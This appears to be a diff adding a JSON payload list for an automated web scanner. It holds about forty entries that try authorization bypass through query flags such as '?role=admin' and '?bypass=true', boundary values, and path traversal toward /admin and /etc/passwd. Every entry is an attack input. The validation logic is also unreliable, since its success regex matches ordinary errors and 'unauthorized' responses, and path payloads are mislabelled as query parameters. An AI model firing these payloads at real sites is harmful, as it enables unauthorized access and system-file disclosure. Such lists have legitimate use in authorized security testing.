@@ -1,0 +1,442 @@
+[
+  {
+    "payload_id": "OWP-65464",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?auth=false&role=admin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65465",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?authenticated=false",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65466",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?authorized=false",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65467",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?bypass=true",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65468",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?error=1&role=admin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65469",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?exception=1&is_admin=true",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65470",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?crash=1&access=full",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65471",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?step=3&complete=1&rollback=0",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65472",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?commit=false",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65473",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?finalize=false",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65474",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?validate=false",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65475",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?checkout=complete&payment=failed",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65476",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?payment=failed&order=created",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65477",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?transaction=partial&token=invalid",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65478",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?timeout=999999",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65479",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?limit=0",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65480",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?limit=-1",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65481",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?limit=999999",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65482",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?max=0",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65483",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?max=-1",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65484",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?max=999999",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65485",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?offset=-1",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65486",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?offset=999999",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65487",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?count=-1",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65488",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?count=999999",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65489",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?page=-1",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65490",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?page=999999",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65491",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?size=0",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65492",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?size=-1",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65493",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?size=999999999",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65494",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/nonexistent-route-that-should-not-exist-12345",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65495",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/../../../../../../../../admin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65496",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/..;/admin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65497",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/..\\admin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65498",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/%2e%2e%2fadmin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65499",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/%2e%2e%5cadmin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65500",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/....//....//....//admin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65501",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/%252e%252e%252fadmin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65502",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/../admin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  },
+  {
+    "payload_id": "OWP-65503",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Failing Open / Priv Esc)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/admin/..;/..;/..;/etc/passwd",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|admin|bypass|unauthorized"
+    }
+  }
+]
